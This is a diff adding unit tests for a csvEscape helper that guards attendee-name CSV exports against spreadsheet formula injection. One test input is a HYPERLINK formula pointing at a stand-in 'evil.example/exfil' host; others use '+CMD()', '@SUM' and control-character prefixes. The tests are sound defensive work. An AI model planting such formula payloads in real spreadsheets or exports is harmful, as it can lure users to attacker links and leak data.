@@ -47,6 +47,54 @@ describe('csvEscape (RFC 4180)', () => {
   it('quotes Bangla names containing commas', () => {
     expect(csvEscape('বেগম, রিনা')).toBe('"বেগম, রিনা"')
   })
+
+  // ─── Formula-injection guard (OWASP CWE-1236) ──────────────────────
+  //
+  // Attendee names are user-controlled. A malicious attendee could
+  // register as `=HYPERLINK(...)` and the formula would fire the first
+  // time the tenant opens the downloaded CSV in Excel. The csvEscape
+  // helper prefixes leading formula-trigger characters with a single
+  // quote, neutralising the formula evaluation. Same fix as PR #258
+  // (disbursement-export); see gotchas.md "CSV exports with UTF-8 BOM
+  // + user-controlled cells = formula-injection vector".
+
+  it('prefixes leading `=` to neutralise formula evaluation', () => {
+    expect(csvEscape('=HYPERLINK("http://evil.example/exfil","click")')).toBe(
+      '"\'=HYPERLINK(""http://evil.example/exfil"",""click"")"',
+    )
+  })
+
+  it('prefixes leading `+`', () => {
+    expect(csvEscape('+CMD()')).toBe(`'+CMD()`)
+  })
+
+  it('prefixes leading `-`', () => {
+    expect(csvEscape('-2+3')).toBe(`'-2+3`)
+  })
+
+  it('prefixes leading `@`', () => {
+    expect(csvEscape('@SUM(A1:A10)')).toBe(`'@SUM(A1:A10)`)
+  })
+
+  it('prefixes leading TAB', () => {
+    expect(csvEscape('\tEvil')).toBe(`'\tEvil`)
+  })
+
+  it('prefixes leading CR (and applies RFC-4180 quoting)', () => {
+    expect(csvEscape('\revil')).toBe(`"'\revil"`)
+  })
+
+  it('does NOT prefix legitimate leading space', () => {
+    expect(csvEscape(' রিনা')).toBe(' রিনা')
+  })
+
+  it('does NOT prefix when formula char appears mid-string', () => {
+    expect(csvEscape('a+b')).toBe('a+b')
+  })
+
+  it('handles formula prefix combined with embedded comma (both guards apply)', () => {
+    expect(csvEscape('=BAD(),attendee')).toBe(`"'=BAD(),attendee"`)
+  })
 })
 
 describe('csvRow', () => {
